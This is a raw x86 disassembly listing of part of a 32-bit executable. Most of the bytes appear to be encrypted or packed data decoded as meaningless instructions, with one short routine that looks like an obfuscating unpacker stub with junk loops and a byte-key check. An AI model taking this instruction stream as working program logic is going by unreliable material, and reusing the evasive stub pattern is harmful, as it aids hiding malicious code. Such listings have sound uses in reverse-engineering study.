  41707b:	dec    ebx
  41707c:	fnstcw WORD PTR [eax-0x2f42cc1b]
  417082:	adc    ebx,DWORD PTR [edi+edx*8-0x74]
  417086:	in     eax,0xe4
  417088:	xor    eax,0xa7bc03b8
  41708d:	or     DWORD PTR [edx-0x4c],edx
  417090:	je     0x41702f
  417092:	jle    0x4170e3
  417094:	mov    eax,ds:0x743d1026
  417099:	ret    
  41709a:	xchg   edx,eax
  41709b:	jno    0x417059
  41709d:	or     esi,DWORD PTR [eax+esi*8+0x7f]
  4170a1:	daa    
  4170a2:	and    ch,BYTE PTR [esi]
  4170a4:	jae    0x4170c1
  4170a6:	mov    gs,WORD PTR [edi-0x69dda05f]
  4170ac:	hlt    
  4170ad:	dec    edx
  4170ae:	xchg   DWORD PTR [ecx-0x2b],edx
  4170b1:	stos   DWORD PTR es:[edi],eax
  4170b2:	arpl   sp,cx
  4170b4:	repnz sbb DWORD PTR [edi-0x77],ebx
  4170b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170b9:	fs addr16 ja 0x417087
  4170bd:	ja     0x4170f2
  4170bf:	push   ebp
  4170c0:	rol    BYTE PTR [edx-0x3b],1
  4170c3:	sub    al,BYTE PTR cs:[ebx]
  4170c6:	inc    eax
  4170c7:	xor    al,0x7b
  4170c9:	jmp    0x417050
  4170cb:	rsqrtps xmm4,xmm6
  4170ce:	inc    esp
  4170cf:	and    al,0xf3
  4170d1:	aaa    
  4170d2:	add    dh,dh
  4170d4:	jbe    0x417113
  4170d6:	inc    eax
  4170d7:	int    0xed
  4170d9:	clc    
  4170da:	pop    es
  4170db:	mov    esp,0x7d773951
  4170e0:	pop    es
  4170e1:	or     BYTE PTR [ecx-0x15],ah
  4170e4:	inc    eax
  4170e5:	inc    ebp
  4170e6:	xor    al,0x97
  4170e8:	(bad)  
  4170e9:	enter  0xfdec,0x32
  4170ed:	stos   DWORD PTR es:[edi],eax
  4170ee:	xchg   DWORD PTR [ebx],ebx
  4170f0:	data16 sub al,0x2f
  4170f3:	xor    BYTE PTR [edi],ah
  4170f5:	push   ss
  4170f6:	mov    dh,0xa3
  4170f8:	retf   0x98ae
  4170fb:	adc    BYTE PTR [eax+0x479aa011],dh
  417101:	sub    ebp,ebx
  417103:	and    BYTE PTR [ebx-0x578e2514],dl
  417109:	xchg   dh,dl
  41710b:	cs pop ecx
  41710d:	call   0x64276709
  417112:	das    
  417113:	and    BYTE PTR [eax],0xfa
  417116:	pushf  
  417117:	cmp    BYTE PTR [ecx],0xb1
  41711a:	jl     0x41713a
  41711c:	jns    0x4170a4
  41711e:	popa   
  41711f:	in     eax,0xc4
  417121:	pop    ebx
  417122:	aad    0xe2
  417124:	push   cs
  417125:	jo     0x41712e
  417127:	xchg   edx,esi
  417129:	test   WORD PTR [ecx+0x67eaea43],sp
  417130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417131:	and    ch,BYTE PTR [eax-0x32253209]
  417137:	ror    ebx,1
  417139:	adc    sp,WORD PTR [ebx]
  41713c:	aam    0x8f
  41713e:	xchg   ecx,eax
  41713f:	cmp    BYTE PTR [ecx-0x6a],0x54
  417143:	ror    BYTE PTR [esi],0x95
  417146:	mov    cl,BYTE PTR [eax]
  417148:	sbb    al,BYTE PTR ds:0xcfb7f6e4
  41714e:	or     esp,esp
  417150:	lock xchg edx,eax
  417152:	out    dx,al
  417153:	jbe    0x417105
  417155:	push   0x2b
  417157:	fwait
  417158:	push   ds
  417159:	mov    eax,0x6c218e5f
  41715e:	sar    DWORD PTR [edx+0x4178997a],1
  417164:	fiadd  DWORD PTR [esi+0x13ca3ff1]
  41716a:	mov    dl,0x19
  41716c:	add    eax,0x55dbaefa
  417171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417172:	nop
  417173:	sub    eax,0x54804352
  417178:	pop    esi
  417179:	xchg   ecx,eax
  41717a:	sub    dh,BYTE PTR [eax]
  41717c:	les    ebx,FWORD PTR [ecx-0x9]
  41717f:	pop    edx
  417180:	dec    esp
  417181:	add    al,0xa9
  417183:	xchg   ebp,eax
  417184:	push   esp
  417185:	pop    ecx
  417186:	addr16 xchg esi,eax
  417188:	repnz fwait
  41718a:	mov    esp,0x9574d764
  41718f:	mov    ah,0x21
  417191:	lods   al,BYTE PTR ds:[esi]
  417192:	pop    edi
  417193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417194:	push   ebx
  417195:	shr    BYTE PTR [ecx+0x60],cl
  417198:	gs xchg edx,eax
  41719a:	mov    ebx,0x1548dcb5
  41719f:	xor    dh,BYTE PTR [eax+ebx*1+0x4b]
  4171a3:	xchg   DWORD PTR [eax],esi
  4171a5:	stos   DWORD PTR es:[edi],eax
  4171a6:	shl    DWORD PTR [edx+0x1e901ee6],1
  4171ac:	jns    0x4171c0
  4171ae:	bound  esi,QWORD PTR [ebp+0x5d819950]
  4171b4:	add    al,BYTE PTR [eax-0x6b]
  4171b7:	dec    eax
  4171b8:	bnd jge 0x417214
  4171bb:	(bad)  
  4171bc:	xor    edi,DWORD PTR [edx]
  4171be:	jae    0x417205
  4171c0:	push   ecx
  4171c1:	mov    ch,0x34
  4171c3:	loope  0x4171b6
  4171c5:	sbb    BYTE PTR [ebp+0x14afc4fd],ah
  4171cb:	or     cl,BYTE PTR [edi]
  4171cd:	iret   
  4171ce:	and    eax,0xff0f93b4
  4171d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171d4:	inc    ebx
  4171d5:	int    0x92
  4171d7:	sbb    BYTE PTR [ebx+0x317e36c0],0xf0
  4171de:	or     ebx,0x9ea4abd8
  4171e4:	xor    BYTE PTR [edi],0x50
  4171e7:	mov    BYTE PTR [edx+ebp*1-0x75],dl
  4171eb:	cwde   
  4171ec:	add    DWORD PTR [esp-0x1c],edi
  4171f0:	pop    eax
  4171f1:	dec    BYTE PTR [ecx+0x7d]
  4171f4:	mov    eax,0x698a5ec7
  4171f9:	hlt    
  4171fa:	jmp    0x417240
  4171fc:	cmp    ah,dh
  4171fe:	mov    ?,WORD PTR [ebx]
  417200:	out    dx,eax
  417201:	(bad)  
  417202:	mov    ah,0x21
  417204:	rol    DWORD PTR [edi+eiz*4-0x6aed1a69],cl
  41720b:	jbe    0x4171b5
  41720d:	jno    0x41721a
  41720f:	or     eax,0x963cf501
  417214:	mov    ebx,0x8fc5a527
  417219:	pop    ds
  41721a:	mov    bl,0xce
  41721c:	pop    esp
  41721d:	xor    DWORD PTR [eax+0xb],0xffffffb5
  417221:	in     eax,dx
  417222:	add    al,BYTE PTR [ebx-0x9b4fe71]
  417228:	adc    BYTE PTR [edx],al
  41722a:	(bad)  
  41722b:	fisubr DWORD PTR ds:0xf3f35035
  417231:	sub    dh,ah
  417233:	push   cs
  417234:	mov    esp,0xa22ae5fe
  417239:	sti    
  41723a:	mov    edi,esp
  41723c:	inc    esi
  41723d:	mov    eax,0x8a17f4f4
  417242:	ins    DWORD PTR es:[edi],dx
  417243:	dec    edx
  417244:	sbb    bl,BYTE PTR [edx+ecx*2-0xe]
  417248:	pop    esp
  417249:	xchg   ebp,eax
  41724a:	int    0xd
  41724c:	inc    edx
  41724d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41724e:	xor    DWORD PTR [esi-0xcadd223],esi
  417254:	test   eax,0xbc6e9e02
  417259:	xor    dl,ah
  41725b:	pop    ss
  41725c:	test   DWORD PTR [edi+0x15e0a5c7],edx
  417262:	adc    eax,0x90d8cd3a
  417267:	(bad)  
  417268:	cld    
  417269:	mov    ah,0x5f
  41726b:	scas   eax,DWORD PTR es:[edi]
  41726c:	jmp    0x5ac62a18
  417271:	sub    DWORD PTR [esi-0x20],esp
  417274:	add    bh,BYTE PTR [eax]
  417276:	rol    esi,1
  417278:	xor    al,0x7d
  41727a:	out    dx,eax
  41727b:	loope  0x417217
  41727d:	ins    DWORD PTR es:[edi],dx
  41727e:	bound  ebx,QWORD PTR [edi-0x4413e59]
  417284:	mov    ah,0x9d
  417286:	mov    ch,0xfd
  417288:	(bad)  
  41728a:	pop    ss
  41728b:	sbb    BYTE PTR [ecx+0x26910809],0x6
  417292:	in     eax,dx
  417293:	and    al,0x6d
  417295:	xchg   edi,eax
  417296:	jl     0x41729c
  417298:	pop    ss
  417299:	fwait
  41729a:	jo     0x417225
  41729c:	xchg   edx,eax
  41729d:	(bad)  
  41729e:	loopne 0x417236
  4172a0:	repnz outs dx,DWORD PTR ds:[esi]
  4172a2:	cmp    eax,0xe058adb5
  4172a7:	push   esi
  4172a8:	xor    BYTE PTR [eax-0x29],al
  4172ab:	rcr    BYTE PTR [edi-0x361008ae],0x53
  4172b2:	lock int 0x90
  4172b5:	pop    edi
  4172b6:	repz pop esi
  4172b8:	in     al,dx
  4172b9:	cmp    al,0xe5
  4172bb:	push   0x2e83a308
  4172c0:	or     DWORD PTR [ecx-0x4de34b35],0xffffffca
  4172c7:	cmp    dh,BYTE PTR [ebp+0x25]
  4172ca:	mov    bl,0x71
  4172cc:	jmp    0x180f:0xc9c22fa9
  4172d3:	aam    0xa3
  4172d5:	mov    esp,0xd4b3d60d
  4172da:	enter  0x3f77,0xbf
  4172de:	jp     0x417348
  4172e0:	adc    esp,ecx
  4172e2:	push   ss
  4172e3:	push   edx
  4172e4:	(bad)  [edx+0x5f]
  4172e7:	jmp    0x461c8e70
  4172ec:	shl    DWORD PTR [eax],cl
  4172ee:	and    al,0xe0
  4172f0:	inc    ebp
  4172f1:	fwait
  4172f2:	repz retf 
  4172f4:	into   
  4172f5:	arpl   ax,di
  4172f7:	ss push 0x5f
  4172fa:	pop    ebx
  4172fb:	jmp    0x81ee479d
  417300:	std    
  417301:	pop    edx
  417302:	dec    ecx
  417303:	xlat   BYTE PTR ds:[ebx]
  417304:	inc    edx
  417305:	out    0xec,eax
  417307:	mov    ds:0xe9462ce1,al
  41730c:	push   esp
  41730d:	pop    ecx
  41730e:	cs push eax
  417310:	sub    edi,edi
  417312:	jne    0x41730c
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	rol    BYTE PTR [esi],1
  417334:	mov    cl,0xd6
  417336:	pushf  
  417337:	loop   0x417361
  417339:	jg     0x4173b3
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x4173af
  417340:	jo     0x4173c1
  417342:	sbb    esi,DWORD PTR [ebp+0xbef79e5]
  417348:	and    BYTE PTR [edx],dl
  41734a:	add    eax,0xd73d04cb
  41734f:	mov    al,ds:0xbcfd168
  417354:	dec    ebx
  417355:	icebp  
  417356:	sub    eax,0x961c8594
  41735b:	jbe    0x417354
  41735d:	jbe    0x4173cd
  41735f:	cmp    edi,esi
  417361:	xor    al,0x71
  417363:	mov    ebp,0x9dd9aaf0
  417368:	or     eax,0x6006d7de
  41736d:	iret   
  41736e:	inc    ebp
  41736f:	dec    eax
  417370:	push   edx
  417371:	fdivr  DWORD PTR [ebx+0x29560f82]
  417377:	repnz sar BYTE PTR [ecx-0x5fed1de9],1
  41737e:	xchg   edx,eax
  41737f:	cmp    DWORD PTR [eax],esi
  417381:	cmp    dh,al
  417383:	pop    ebp
  417384:	jns    0x4173bf
  417386:	ss stos DWORD PTR es:[edi],eax
  417388:	sbb    eax,0x4c4f03be
  41738d:	jg     0x4173db
  41738f:	xor    ebp,esi
  417391:	inc    ebx
  417392:	sti    
  417393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417394:	aas    
  417395:	cmp    ch,BYTE PTR [edx+0x32cf2e05]
  41739b:	cmp    al,0x83
  41739d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41739e:	lods   al,BYTE PTR ds:[esi]
  41739f:	(bad)  
  4173a0:	shl    BYTE PTR [ebp-0x3f],cl
  4173a3:	rcl    BYTE PTR [ecx+0x782be268],cl
  4173a9:	jle    0x417426
  4173ab:	addr16 xchg edx,eax
  4173ad:	mov    eax,?
  4173af:	lods   eax,DWORD PTR ds:[esi]
  4173b0:	lock fs jno 0x417370
  4173b4:	add    BYTE PTR [ebp-0x62],dh
  4173b7:	stos   DWORD PTR es:[edi],eax
  4173b8:	js     0x417406
  4173ba:	fmul   st,st(6)
  4173bc:	jno    0x417391
  4173be:	mov    ds:0x2dfbf264,eax
  4173c3:	bound  esi,QWORD PTR [edx+eax*4-0x2]
  4173c7:	stc    
  4173c8:	adc    eax,ebx
  4173ca:	dec    esi
  4173cb:	pop    esi
  4173cc:	lods   eax,DWORD PTR ds:[esi]
  4173cd:	lea    ebp,[ebp+edx*8-0x3b]
  4173d1:	bound  esi,QWORD PTR [ebp+0x783a293]
  4173d7:	fcom   DWORD PTR [eax+edx*1-0xf]
  4173db:	jnp    0x41745b
  4173dd:	data16 hlt 
  4173df:	mov    dl,dl
  4173e1:	data16 jg 0x4173d6
  4173e4:	dec    esi
  4173e5:	scas   eax,DWORD PTR es:[edi]
  4173e6:	(bad)  
  4173e7:	xor    al,0x47
  4173e9:	retf   0x8e41
  4173ec:	jl     0x417395
  4173ee:	dec    edi
  4173ef:	push   esi
  4173f0:	in     eax,0x28
  4173f2:	outs   dx,DWORD PTR ds:[esi]
  4173f3:	and    al,0x8c
  4173f5:	push   eax
  4173f6:	mov    esp,0x7746b4e7
  4173fb:	mov    ch,0x2e
  4173fd:	scas   al,BYTE PTR es:[edi]
  4173fe:	enter  0xaa0a,0x64
  417402:	ja     0x417459
  417404:	les    ecx,FWORD PTR [ebx-0x76aaba81]
  41740a:	cld    
  41740b:	dec    edi
  41740c:	ds hlt 
  41740e:	dec    esi
  41740f:	jmp    0x417481
  417411:	clc    
  417412:	or     al,0x5
  417414:	loopne 0x41740d
  417416:	(bad)  
  417417:	lods   eax,DWORD PTR ds:[esi]
  417418:	add    bh,0x5f
  41741b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41741c:	loopne 0x417437
  41741e:	pushf  
  41741f:	nop
  417420:	adc    eax,0x1303c7e9
  417425:	shl    cl,0x8b
  417428:	sbb    BYTE PTR [edx+edi*1],ah
  41742b:	push   0xffffff82
  41742d:	xor    edx,DWORD PTR ds:[esi-0x225301af]
  417434:	loope  0x417464
  417436:	das    
  417437:	call   0x15a1aa9a
  41743c:	aam    0x34
  41743e:	push   eax
  41743f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417440:	mov    edi,DWORD PTR fs:[eax+0x17]
  417444:	push   ebx
  417445:	fs push ss
  417447:	inc    ebx
  417448:	jl     0x4174a7
  41744a:	mov    edi,0xe68a3220
  41744f:	push   edi
  417450:	fdivr  DWORD PTR [ebp-0x4e161949]
  417456:	jne    0x417459
  417458:	pushf  
  417459:	ret    
  41745a:	adc    al,0xd3
  41745c:	jnp    0x41740b
  41745e:	mov    bh,0x4
  417460:	cmc    
  417461:	les    esp,FWORD PTR [edx+ebp*8+0x77]
  417465:	imul   edx,ebp,0xffffff91
  417468:	adc    esp,ecx
  41746a:	and    ecx,eax
  41746c:	pop    di
  41746e:	das    
  41746f:	lods   al,BYTE PTR ds:[esi]
  417470:	xor    eax,0xc74270f4
  417475:	add    cl,ch
  417477:	mov    ds:0xfb65f4d1,al
  41747c:	cmp    al,0x1c
  41747e:	mov    bh,0x32
  417480:	test   al,0x3e
  417482:	aad    0xec
  417484:	data16 shl ah,cl
  417487:	sbb    DWORD PTR [ecx],0xffffff88
  41748a:	dec    ebp
  41748b:	clc    
  41748c:	cld    
  41748d:	or     eax,0xbc99e9af
  417492:	pop    esi
  417493:	pop    ebp
  417494:	jb     0x41744c
  417496:	sbb    al,0x35
  417498:	xor    ah,BYTE PTR [ebp+0x5f]
  41749b:	xor    BYTE PTR [edx+0x1],0x14
  41749f:	stos   DWORD PTR es:[edi],eax
  4174a0:	mov    edx,0xec09e020
  4174a5:	neg    ebx
  4174a7:	jge    0x417497
  4174a9:	(bad)  
  4174aa:	push   0x8bc99f77
  4174af:	ss cwde 
  4174b1:	fdiv   st,st(7)
  4174b3:	mov    bh,0x6d
  4174b5:	pop    edx
  4174b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174b7:	fsubr  QWORD PTR [esi+esi*2]
  4174ba:	push   0xff2d8d28
  4174bf:	in     eax,0x37
  4174c1:	jnp    0x417472
  4174c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174c4:	pop    edx
  4174c5:	(bad)  
  4174c6:	mov    ds:0x42f1b69b,al
  4174cb:	sub    BYTE PTR [ecx-0x71c76d56],bh
  4174d1:	push   ebx
  4174d2:	mov    ecx,0x3155b6fc
  4174d7:	dec    ebp
  4174d8:	mov    dl,bl
  4174da:	out    0x64,eax
  4174dc:	and    eax,0xcd6e74e
  4174e1:	loop   0x4174ba
  4174e3:	and    BYTE PTR [edx+esi*2],al
  4174e6:	pop    ecx
  4174e7:	hlt    
  4174e8:	mov    ah,0x60
  4174ea:	mov    edi,0x894dd68e
  4174ef:	mov    ds:0x695a8d88,eax
  4174f4:	xor    ah,BYTE PTR [ecx+0x3a]
  4174f7:	adc    DWORD PTR [ebx-0x461a86],ebp
  4174fd:	mov    WORD PTR [eax-0x4da26e3f],fs
  417503:	repnz or BYTE PTR [edi],dl
  417506:	pop    ds
  417507:	ds inc ebx
  417509:	fisub  WORD PTR [esi+eax*4+0x66]
  41750d:	popa   
  41750e:	sbb    ah,ah
  417510:	fisub  DWORD PTR [ebp-0x20]
  417513:	jnp    0x4174c2
  417515:	stos   DWORD PTR es:[edi],eax
  417516:	pushf  
  417517:	cmp    edx,ebx
  417519:	add    al,0x79
  41751b:	jle    0x417565
  41751d:	shr    DWORD PTR [edx],1
  41751f:	or     al,0x72
  417521:	jmp    0x417556
  417523:	or     al,0x19
  417525:	or     al,0xe8
  417527:	push   ecx
  417528:	sbb    al,0x39
  41752a:	int    0x29
  41752c:	pushf  
  41752d:	(bad)  
  41752e:	jmp    0x4174e6
  417530:	inc    ebp
  417531:	inc    edx
  417532:	int3   
  417533:	mov    gs,edi
  417535:	shr    BYTE PTR [edi+0x69],1
  417538:	lahf   
  417539:	cmp    dh,cl
  41753b:	cmp    BYTE PTR [esi+0x7b],bl
  41753e:	adc    esp,DWORD PTR [ecx]
  417540:	loope  0x417523
  417542:	or     eax,ebp
  417544:	iret   
  417545:	fisttp QWORD PTR [esi-0xdfdf689]
  41754b:	dec    edi
  41754c:	cmp    dh,BYTE PTR [esp+eax*2]
  41754f:	xrelease mov DWORD PTR [ebx+0x350cfd84],esi
  417556:	mov    dh,0xc9
  417558:	lds    ecx,FWORD PTR [edi+esi*8+0x15]
  41755c:	call   0xd0b5:0xbf08871b
  417563:	fs pop esi
  417565:	push   es
  417566:	imul   ebp,DWORD PTR ds:0x5cbd7126,0xffffffc8
  41756d:	into   
  41756e:	std    
  41756f:	out    0xc0,eax
  417571:	test   eax,0xe5239e87
  417576:	iret   
  417577:	int3   
  417578:	js     0x41753d
  41757a:	or     al,0x6a
  41757c:	adc    al,0x9
  41757e:	imul   ebp,edi,0xd5223e74
  417584:	jg     0x41758f
  417586:	push   ecx
  417587:	addr16 aam 0x9b
  41758a:	out    0x7,al
  41758c:	mov    edx,0xe00bec7
  417591:	popf   
  417592:	mov    ecx,0xfe2d9efd
  417597:	rcr    BYTE PTR [edx-0x7c476c89],cl
  41759d:	sub    al,0xa5
  41759f:	rcl    DWORD PTR [esi+0x9516c54],1
  4175a5:	xor    esp,ebx
  4175a7:	stos   BYTE PTR es:[edi],al
  4175a8:	out    0x38,al
  4175aa:	xchg   edi,eax
  4175ab:	test   DWORD PTR [ebp+0x63],edi
  4175ae:	dec    esi
  4175af:	and    al,0xd1
  4175b1:	aad    0x69
  4175b3:	scas   eax,DWORD PTR es:[edi]
  4175b4:	aaa    
  4175b5:	ficom  WORD PTR [ecx]
  4175b7:	and    BYTE PTR [esi-0x169c1f52],0x52
  4175be:	fsubr  QWORD PTR [ebp+esi*2-0x65eb5e96]
  4175c5:	retf   
  4175c6:	dec    esp
  4175c7:	stos   DWORD PTR es:[edi],eax
  4175c8:	adc    DWORD PTR [ecx],edx
  4175ca:	push   ss
  4175cb:	jns    0x417612
  4175cd:	and    BYTE PTR [edx-0x4b],dl
  4175d0:	sub    ebp,DWORD PTR [eax+eax*2]
  4175d3:	fcom   DWORD PTR [edi]
  4175d5:	push   esp
  4175d6:	push   ecx
  4175d7:	sti    
  4175d8:	out    0x13,al
  4175da:	add    eax,esi
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	ss mov al,0x88
  4176bd:	xchg   edx,eax
  4176be:	jg     0x4176ed
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0x8d78787e
  4176c7:	pop    ebx
  4176c8:	rcl    BYTE PTR [eax+0x273cf0c6],1
  4176ce:	sahf   
  4176cf:	les    ebp,FWORD PTR [ecx-0x3c]
  4176d2:	pop    ds
  4176d3:	mov    eax,0x2772c1e7
  4176d8:	mov    dh,0x78
  4176da:	dec    esi
  4176db:	add    bh,ah
  4176dd:	and    dl,bh
  4176df:	cwde   
  4176e0:	xor    edx,edi
  4176e2:	cmp    al,0x60
  4176e4:	ss jge 0x417680
  4176e7:	rcr    BYTE PTR [ecx+0x4],1
  4176ea:	xchg   ebx,eax
  4176eb:	jp     0x41768a
  4176ed:	test   BYTE PTR [ebx-0x1352fe00],ch
  4176f3:	icebp  
  4176f4:	mov    al,ds:0x253bb262
  4176f9:	out    0x99,al
  4176fb:	mov    edi,0x8700a507
  417700:	rcl    DWORD PTR [ecx],1
  417702:	cmp    DWORD PTR [edi-0x74],ecx
  417705:	xchg   BYTE PTR [esi+0x1d56176e],dl
  41770b:	outs   dx,BYTE PTR ds:[esi]
  41770c:	push   ebx
  41770d:	push   esp
  41770e:	jae    0x417780
  417710:	into   
  417711:	sub    DWORD PTR [ebp+0x54],0xffffff97
  417715:	jmp    0x4176aa
  417717:	in     eax,0x38
  417719:	sub    eax,0x58350c47
  41771e:	or     esp,DWORD PTR [esp+ecx*8]
  417721:	and    eax,0x5b8d4d81
  417726:	cmp    edi,DWORD PTR [eax+0x6d329e24]
  41772c:	inc    ebx
  41772d:	in     al,0x44
  41772f:	push   0x5b
  417731:	les    esp,FWORD PTR [ecx-0x5]
  417734:	std    
  417735:	rcl    bh,0xf9
  417738:	ficom  DWORD PTR [edx-0x5341d109]
  41773e:	loop   0x4177b5
  417740:	mov    ?,WORD PTR [edi-0x2e]
  417743:	fist   DWORD PTR [edx+0x2e8c89f8]
  417749:	sbb    ah,BYTE PTR [eax-0x3c]
  41774c:	test   al,0x61
  41774e:	je     0x4176e9
  417750:	mov    edi,0x634753b0
  417755:	push   esp
  417756:	mov    ch,0xad
  417758:	sbb    ecx,DWORD PTR [ebp+0x41]
  41775b:	loopne 0x4176fd
  41775d:	loopne 0x417786
  41775f:	cdq    
  417760:	mov    edi,0x99bcc8ac
  417765:	push   ebx
  417766:	frstor [edi-0x10]
  417769:	cmc    
  41776a:	rol    DWORD PTR [eax-0x29dbf233],0x54
  417771:	sbb    BYTE PTR [esi-0x503ce5fd],ch
  417777:	and    ch,BYTE PTR [ebx+0x5979ba4c]
  41777d:	pop    edi
  41777e:	arpl   WORD PTR [edx+0x1f],sp
  417781:	pop    ds
  417782:	sbb    ebx,DWORD PTR [ebp-0x6bfab0d]
  417788:	loop   0x417725
  41778a:	push   ebp
  41778b:	mov    ds:0xde0b4aa6,al
  417790:	mov    edx,0xb06a466b
  417795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417796:	adc    edi,ebp
  417798:	in     al,0xc3
  41779a:	retf   0x67
  41779d:	cmc    
  41779e:	imul   edx,DWORD PTR ds:0x6f8fcdb9,0xffffffc1
  4177a5:	pop    es
  4177a6:	stos   BYTE PTR es:[edi],al
  4177a7:	inc    eax
  4177a8:	out    0xbe,al
  4177aa:	scas   al,BYTE PTR es:[edi]
  4177ab:	(bad)  
  4177ac:	push   0x15
  4177ae:	(bad)  
  4177af:	ss jge 0x4177a8
  4177b2:	cs inc eax
  4177b4:	sub    eax,0x2fc8b5b0
  4177b9:	jno    0x417765
  4177bb:	mul    BYTE PTR [edi]
  4177bd:	push   0x2c
  4177bf:	mov    ds:0x2840a0e,al
  4177c4:	mov    bl,0x5d
  4177c6:	jbe    0x41780e
  4177c8:	(bad)  
  4177ca:	adc    bl,BYTE PTR [ebx]
  4177cc:	push   ss
  4177cd:	push   edi
  4177ce:	ds (bad) 
  4177d0:	xchg   esi,eax
  4177d1:	inc    ecx
  4177d2:	mov    al,ds:0x233eceb8
  4177d7:	cmp    esp,ebx
  4177d9:	std    
  4177da:	and    al,0xaf
  4177dc:	out    0x69,eax
  4177de:	adc    BYTE PTR [ebx+eiz*1+0x70f16ed5],dl
  4177e5:	or     DWORD PTR [eax-0x29fcd6a],eax
  4177eb:	sahf   
  4177ec:	sbb    esp,ecx
  4177ee:	ins    BYTE PTR es:[edi],dx
  4177ef:	mov    ebx,0x9ab4852a
  4177f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177f5:	daa    
  4177f6:	mov    dh,0x45
  4177f8:	mov    edx,0xa21218a2
  4177fd:	jg     0x4177dd
  4177ff:	adc    BYTE PTR [ecx+0x3d89e7c0],dl
  417805:	test   al,0x32
  417807:	leave  
  417808:	fst    QWORD PTR [ecx+0x7f]
  41780b:	nop
  41780c:	mov    ds:0x9947da6b,eax
  417811:	pop    ebp
  417812:	addr16 jne 0x417865
  417815:	fistp  DWORD PTR [ebp+ecx*4-0x43cc93d2]
  41781c:	mul    al
  41781e:	jbe    0x4177a7
  417820:	adc    al,0xff
  417822:	(bad)  
  417823:	and    dh,BYTE PTR [edx+0x51]
  417826:	mov    bh,0x7b
  417828:	mov    esi,edx
  41782a:	jbe    0x4177e9
  41782c:	jp     0x4177fa
  41782e:	inc    esp
  41782f:	mov    ds:0x6932cce7,eax
  417834:	mov    WORD PTR [ecx],gs
  417836:	mov    cl,0x70
  417838:	add    eax,DWORD PTR [edx]
  41783a:	push   esp
  41783b:	and    BYTE PTR [edx-0x67],bh
  41783e:	jmp    0x41780c
  417840:	add    edx,DWORD PTR [ebp-0x51]
  417843:	jae    0x41784e
  417845:	mov    DWORD PTR [ecx+0x5fde1b89],0x2623d9a8
  41784f:	(bad)  ds:[esi+0x52177cfd]
  417856:	imul   esp,DWORD PTR [esi+edi*4+0x4f],0x31c7896f
  41785e:	test   DWORD PTR [edi+0x54eefa43],esi
  417864:	shld   ebx,esp,0x94
  417868:	(bad)  
  417869:	(bad)  ds:0xbb97d555
  41786f:	cmc    
  417870:	inc    ebp
  417871:	xor    BYTE PTR [esi-0xa],bh
  417874:	ja     0x417898
  417876:	dec    eax
  417877:	push   0xea5c00e
  41787c:	xchg   ebp,eax
  41787d:	push   ds
  41787e:	and    bh,al
  417880:	repnz bound edi,QWORD PTR [esi-0x2b]
  417884:	outs   dx,DWORD PTR ds:[esi]
  417885:	xor    DWORD PTR [edi-0x2744ef84],ecx
  41788b:	rcr    BYTE PTR [ebx],0x24
  41788e:	mov    eax,DWORD PTR [edi+edx*4-0x76]
  417892:	mov    ds,WORD PTR [edi+eiz*8+0x6]
  417896:	lock mov ds:0x35226f45,eax
  41789c:	sub    eax,0x66d69b99
  4178a1:	add    edx,DWORD PTR [esi]
  4178a3:	xchg   edx,eax
  4178a4:	das    
  4178a5:	cmp    DWORD PTR [esi],eax
  4178a7:	push   edi
  4178a8:	dec    ebx
